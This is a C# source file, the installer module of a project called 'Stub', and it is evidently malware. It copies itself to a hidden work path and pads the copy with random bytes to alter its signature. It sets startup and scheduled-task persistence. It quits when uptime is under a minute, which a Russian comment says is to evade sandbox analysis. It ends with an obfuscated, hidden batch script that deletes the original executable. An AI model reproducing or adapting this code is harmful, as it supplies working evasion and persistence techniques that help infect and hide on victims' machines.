using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Stub.Startup;
using Stub.Help;
using System.Windows.Forms;
using Stub.Help.Native;
using Stub.Help.Modules;
using System.Runtime.InteropServices;

namespace Stub
{
    class Install
    {
        public static void Run()
        {
            if (!MyPath() && !File.Exists(StringHelper.WorkFile.FullName))
            {
                List<Thread> threads = new List<Thread>
        {
            new Thread(() => CopyFiles()),
            new Thread(() => COMStartup.AddToStartup(StringHelper.WorkFile.FullName, Config.taskName)),
            new Thread(() => TaskCreat.Set()),
        };

                foreach (Thread thread in threads)
                    thread.Start();

                foreach (Thread thread in threads)
                    thread.Join();

                Process.Start(StringHelper.WorkFile.FullName);

                if (Config.sourcefileDelete)
                    DeleteSourceAndBuild();
                else
                    Environment.Exit(0);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern ulong GetTickCount64();
        public static void CopyFiles()
        {
            // Защита он рантайм детекта, просто закрываемся если с момента запуска Windows прошло менее минуты.
            // Так как скорее всего это виртуальная среда для анализа поведения файла.
            ulong uptime = GetTickCount64();
            TimeSpan uptimeSpan = TimeSpan.FromMilliseconds(uptime);
            if (uptimeSpan.TotalMinutes < 1)
            {
                Environment.Exit(0);
            }

            Directory.CreateDirectory(StringHelper.WorkPatch.FullName);
            StringHelper.WorkPatch.Refresh();

            try
            {
                if (StringHelper.addresses == null)
                    Environment.Exit(-1);

                if (Config.AddBytes)
                {
                    using (FileStream fs = new FileStream(StringHelper.WorkFile.FullName, FileMode.OpenOrCreate))
                    {
                        byte[] byte_exe = File.ReadAllBytes(StringHelper.CurrentProcess);
                        fs.Write(byte_exe, 0, byte_exe.Length);

                        byte[] addB = new byte[new Random().Next(Config.Addbkb * 1024, Config.Addbkb * 1024)];
                        new Random().NextBytes(addB);
                        fs.Write(addB, 0, addB.Length);
                    }
                }
                else
                {
                    File.Copy(StringHelper.CurrentProcess, StringHelper.WorkFile.FullName);
                }
            }
            catch
            {
                File.Copy(StringHelper.CurrentProcess, StringHelper.WorkFile.FullName);
            }
        }

        public static bool MyPath()
        {
            return StringHelper.CurrentProcess == StringHelper.WorkFile.FullName;
        }

        public static void DeleteSourceAndBuild()
        {
            string batchFilePath = Path.GetTempFileName() + ".cmd";

            using (StreamWriter sw = new StreamWriter(batchFilePath))
            {
                sw.WriteLine("%@%e%c%h%o% %o%f%f%".Replace("%", ""));
                sw.WriteLine("%t%i%m%e%o%u%t% %6% %>% %N%U%L%".Replace("%", ""));
                sw.WriteLine("CD " + Application.StartupPath);
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batchFilePath) + "\"" + " /f /q");
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batchFilePath,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

            Environment.Exit(0);
        }
    }
}
